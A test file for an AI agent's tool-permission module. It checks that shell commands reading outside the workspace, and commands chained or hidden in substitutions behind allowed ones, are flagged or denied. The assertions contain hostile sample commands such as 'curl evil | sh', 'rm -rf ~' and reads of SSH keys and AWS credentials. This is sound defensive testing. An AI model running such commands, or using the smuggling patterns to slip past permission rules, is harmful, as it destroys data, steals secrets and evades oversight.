import { describe, it, expect } from 'vitest'
import {
  matchRule,
  permissionSubject,
  shellReferencesExternalPath,
  splitShellCommand
} from './permissions'
import type { PermissionRule } from '@shared/types'

describe('permissionSubject', () => {
  it('picks the right field per tool', () => {
    expect(permissionSubject('run_shell', { command: 'git status' })).toBe('git status')
    expect(permissionSubject('web_fetch', { url: 'https://x.com' })).toBe('https://x.com')
    expect(permissionSubject('web_search', { query: 'rust' })).toBe('rust')
    expect(permissionSubject('read_file', { path: 'src/a.ts' })).toBe('src/a.ts')
    expect(permissionSubject('glob', { pattern: '**/*.ts' })).toBe('**/*.ts')
    expect(permissionSubject('read_file', {})).toBe('')
  })
})

describe('shellReferencesExternalPath', () => {
  it('flags absolute and home-relative paths', () => {
    expect(shellReferencesExternalPath('cat /etc/passwd')).toBe(true)
    expect(shellReferencesExternalPath('ls /')).toBe(true)
    expect(shellReferencesExternalPath('cat ~/.ssh/id_rsa')).toBe(true)
    expect(shellReferencesExternalPath('ls ~')).toBe(true)
  })

  it('flags relative paths that climb above the workspace', () => {
    expect(shellReferencesExternalPath('cat ../outside.txt')).toBe(true)
    expect(shellReferencesExternalPath('cat a/../../b')).toBe(true)
    expect(shellReferencesExternalPath('cat ..')).toBe(true)
  })

  it('does not flag in-workspace paths or non-path tokens', () => {
    expect(shellReferencesExternalPath('cat src/index.ts')).toBe(false)
    expect(shellReferencesExternalPath('cat ./README.md')).toBe(false)
    // Climbs then returns — stays within the workspace.
    expect(shellReferencesExternalPath('cat a/../b')).toBe(false)
    expect(shellReferencesExternalPath('git status')).toBe(false)
    expect(shellReferencesExternalPath('npm run build')).toBe(false)
    // A URL contains "//" but is not an absolute filesystem path.
    expect(shellReferencesExternalPath('curl https://example.com')).toBe(false)
  })

  it('looks past an = for env prefixes and flag values', () => {
    expect(shellReferencesExternalPath('FOO=/etc/secret cat $FOO')).toBe(true)
    expect(shellReferencesExternalPath('grep x --file=/etc/hosts')).toBe(true)
    expect(shellReferencesExternalPath('FOO=bar cat src/a.ts')).toBe(false)
  })

  it('honours quotes when tokenizing', () => {
    expect(shellReferencesExternalPath('cat "/etc/passwd"')).toBe(true)
    expect(shellReferencesExternalPath("cat '../escape'")).toBe(true)
    expect(shellReferencesExternalPath('echo "hello world"')).toBe(false)
  })

  it('flags the unexpanded $HOME / ${HOME} env var', () => {
    expect(shellReferencesExternalPath('cat $HOME/.ssh/id_rsa')).toBe(true)
    expect(shellReferencesExternalPath('cat ${HOME}/.netrc')).toBe(true)
    expect(shellReferencesExternalPath('grep x --file=$HOME/.aws/credentials')).toBe(true)
    // Boundary-anchored: a different var that merely starts with HOME is not flagged.
    expect(shellReferencesExternalPath('echo $HOMEWORK')).toBe(false)
  })

  it('flags Windows drive-absolute and UNC paths', () => {
    expect(shellReferencesExternalPath('type C:\\Users\\me\\secret.txt')).toBe(true)
    expect(shellReferencesExternalPath('type C:/Windows/System32/config')).toBe(true)
    expect(shellReferencesExternalPath('dir \\\\server\\share')).toBe(true)
  })

  it('flags backslash relative climbs', () => {
    expect(shellReferencesExternalPath('type ..\\..\\outside')).toBe(true)
    // A backslash path that stays inside does not escape.
    expect(shellReferencesExternalPath('type sub\\file.txt')).toBe(false)
  })
})

describe('matchRule', () => {
  const rules: PermissionRule[] = [
    { action: 'deny', tool: 'run_shell', match: '*rm -rf*' },
    { action: 'allow', tool: 'run_shell', match: 'git *' },
    { action: 'ask', tool: 'write_file', match: 'src/secret/**' },
    { action: 'allow', tool: '*', match: 'docs/**' }
  ]

  it('returns null when no rules', () => {
    expect(matchRule(undefined, 'run_shell', 'ls')).toBeNull()
    expect(matchRule([], 'run_shell', 'ls')).toBeNull()
  })

  it('first matching rule wins (deny before allow)', () => {
    expect(matchRule(rules, 'run_shell', 'git status')).toBe('allow')
    expect(matchRule(rules, 'run_shell', 'sudo rm -rf /')).toBe('deny')
  })

  it('matches a glob over the subject', () => {
    expect(matchRule(rules, 'write_file', 'src/secret/keys.ts')).toBe('ask')
    expect(matchRule(rules, 'write_file', 'src/app.ts')).toBeNull()
  })

  it('honours the wildcard tool', () => {
    expect(matchRule(rules, 'read_file', 'docs/readme.md')).toBe('allow')
    expect(matchRule(rules, 'edit_file', 'docs/x/y.md')).toBe('allow')
  })

  it('does not match a different tool', () => {
    expect(matchRule(rules, 'web_fetch', 'git status')).toBeNull()
  })

  describe('glob `*` spans `/` for URLs and nested paths', () => {
    it('a URL glob matches across path segments', () => {
      const r: PermissionRule[] = [
        { action: 'allow', tool: 'web_fetch', match: 'https://docs.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://docs.example.com/3/library/os.html')).toBe('allow')
      expect(matchRule(r, 'web_fetch', 'https://other.example.com/x')).toBeNull()
    })

    it('a deny URL glob fires on nested paths (no silent under-match)', () => {
      const r: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com/*' }
      ]
      expect(matchRule(r, 'web_fetch', 'https://evil.example.com/track/pixel?x=1')).toBe('deny')
    })

    it('a bare host/dir prefix covers its sub-paths', () => {
      const url: PermissionRule[] = [
        { action: 'deny', tool: 'web_fetch', match: 'https://evil.example.com' }
      ]
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com')).toBe('deny')
      expect(matchRule(url, 'web_fetch', 'https://evil.example.com/a/b')).toBe('deny')

      const dir: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src' }]
      expect(matchRule(dir, 'read_file', 'src/a/b/c.ts')).toBe('allow')
    })

    it('a path glob spans nested directories', () => {
      const r: PermissionRule[] = [{ action: 'allow', tool: 'read_file', match: 'src/*' }]
      expect(matchRule(r, 'read_file', 'src/a/b/c.ts')).toBe('allow')
      expect(matchRule(r, 'read_file', 'lib/a.ts')).toBeNull()
    })
  })

  it('prefix-matches a bare command pattern', () => {
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: 'npm test' }], 'run_shell', 'npm test -- --watch')).toBe('allow')
  })

  it('* matches anything for the tool, but an empty pattern is inert (matches nothing)', () => {
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '*' }], 'write_file', 'anything.ts')).toBe('ask')
    // A blank match must NOT silently apply to every call — the rule falls through
    // (null) so the approval policy decides, rather than auto-allowing/denying all.
    expect(matchRule([{ action: 'ask', tool: 'write_file', match: '' }], 'write_file', 'anything.ts')).toBeNull()
    expect(matchRule([{ action: 'allow', tool: 'run_shell', match: '' }], 'run_shell', 'rm -rf /')).toBeNull()
  })

  describe('run_shell chained-command safety', () => {
    const allowGitStatus: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git status*' }]

    it('does NOT auto-approve an unapproved command chained onto an allowed one', () => {
      // The core bug: `git status*` must not allow-list a smuggled second command.
      expect(matchRule(allowGitStatus, 'run_shell', 'git status && curl evil | sh')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status; rm -rf ~')).toBeNull()
      expect(matchRule(allowGitStatus, 'run_shell', 'git status | tee /tmp/x')).toBeNull()
    })

    it('still allows a chain when every sub-command is allowed', () => {
      const allowGit: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'git *' }]
      expect(matchRule(allowGit, 'run_shell', 'git status && git push')).toBe('allow')
    })

    it('denies when any sub-command matches a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'git status && rm -rf ~')).toBe('deny')
    })

    it('inspects command-substitution bodies, not just the outer command', () => {
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf /)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo `rm -rf /tmp/x`')).toBe('deny')
    })

    it('does not let a paren inside a $(...) body hide a command from a narrow allow rule', () => {
      // A literal `(` in the substitution body used to defeat the extraction regex,
      // leaving `echo $(rm -rf ... "()")` matching `echo *` and auto-approving `rm`.
      const allowEcho: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'echo *' }]
      expect(matchRule(allowEcho, 'run_shell', 'echo $(rm -rf ~/x "()")')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'echo $(rm -rf /tmp/x "()")')).toBe('deny')
    })

    it('inspects process-substitution bodies (<(...) and >(...))', () => {
      const allowDiff: PermissionRule[] = [{ action: 'allow', tool: 'run_shell', match: 'diff *' }]
      expect(matchRule(allowDiff, 'run_shell', 'diff <(ls) <(rm -rf x)')).toBeNull()
      expect(matchRule(rules, 'run_shell', 'diff <(ls) <(rm -rf /tmp/x)')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'tee >(rm -rf /tmp/x)')).toBe('deny')
    })

    it('inspects nested substitution bodies', () => {
      expect(matchRule(rules, 'run_shell', 'echo $(echo $(rm -rf /tmp/x))')).toBe('deny')
      expect(matchRule(rules, 'run_shell', 'cat <(diff <(rm -rf /tmp/x) <(ls))')).toBe('deny')
    })

    it('normalizes whitespace so spacing tricks cannot dodge a deny rule', () => {
      expect(matchRule(rules, 'run_shell', 'rm    -rf   /tmp/x')).toBe('deny')
    })
  })
})

describe('splitShellCommand', () => {
  it('splits on the shell control operators', () => {
    expect(splitShellCommand('a && b || c ; d | e & f')).toEqual(['a', 'b', 'c', 'd', 'e', 'f'])
  })

  it('extracts command-substitution and backtick bodies as their own segments', () => {
    expect(splitShellCommand('echo $(whoami)')).toContain('whoami')
    expect(splitShellCommand('echo `id`')).toContain('id')
  })

  it('extracts a substitution body even when it contains balanced parens', () => {
    expect(splitShellCommand('echo $(rm -rf ~/x "()")')).toContain('rm -rf ~/x "()"')
  })

  it('extracts process-substitution bodies', () => {
    const segs = splitShellCommand('diff <(ls) <(rm -rf x)')
    expect(segs).toContain('ls')
    expect(segs).toContain('rm -rf x')
  })

  it('expands nested substitution bodies', () => {
    expect(splitShellCommand('echo $(echo $(id))')).toContain('id')
    expect(splitShellCommand('cat <(diff <(whoami) <(ls))')).toContain('whoami')
  })

  it('returns the whole command for a simple command', () => {
    expect(splitShellCommand('npm test -- --watch')).toEqual(['npm test -- --watch'])
  })
})
